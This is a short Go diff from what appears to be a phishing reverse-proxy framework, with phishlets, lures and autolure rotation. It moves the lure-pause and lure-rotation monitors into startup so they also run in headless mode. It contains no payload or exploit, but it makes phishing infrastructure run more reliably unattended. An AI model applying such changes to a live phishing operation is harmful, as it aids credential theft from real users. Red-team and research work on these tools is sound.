@@ -75,6 +75,10 @@ func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Databas
 	// headless (-noterm) mode gets valid TLS certificates at startup instead
 	// of failing handshakes until an interactive terminal runs.
 	go t.manageCertificates(true)
+	// Start the background monitors here (not in DoWork) so lure pause expiry and
+	// autolure rotation also run in headless (-noterm / systemd) mode.
+	go t.monitorLurePause()
+	go t.monitorAutoLureRotation()
 	return t, nil
 }
 
@@ -103,8 +107,6 @@ func (t *Terminal) DoWork() {
 	t.manageCertificates(true)
 
 	t.output("%s", t.sprintPhishletStatus(""))
-	go t.monitorLurePause()
-	go t.monitorAutoLureRotation()
 
 	for !do_quit {
 		line, err := t.rl.Readline()
